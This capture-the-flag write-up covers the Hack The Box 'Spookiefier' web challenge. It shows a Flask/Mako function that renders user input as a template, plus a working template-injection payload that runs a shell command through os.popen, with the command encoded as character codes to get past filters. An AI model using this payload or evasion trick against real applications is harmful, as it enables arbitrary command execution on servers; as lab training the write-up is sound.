---
layout: page
description: "SSTI Mako"
title: "[WEB] HTB Challenge - Spookiefier"
---

# [WEB] HTB Challenge - Spookiefier

To solve this challenge you should static analyze the files. You will find that it uses *flask_mako* and it will eval all the mako code
```
def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render() // vuln
```

So for sure there are some filters, but checking on the internet you can find the solution.
What I suggest is to write an easy script in which you insert a string and you receive an array of chars in order to generate a list like:
```
Enter a string: cat /flag.txt                                                                                                                                                                 [99, 97, 116, 32, 47, 102, 108, 97, 103, 46, 116, 120, 116]
```

Like this you can inject the input:
```
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[99, 97, 116, 32, 47, 102, 108, 97, 103, 46, 116, 120, 116])).read()}
```
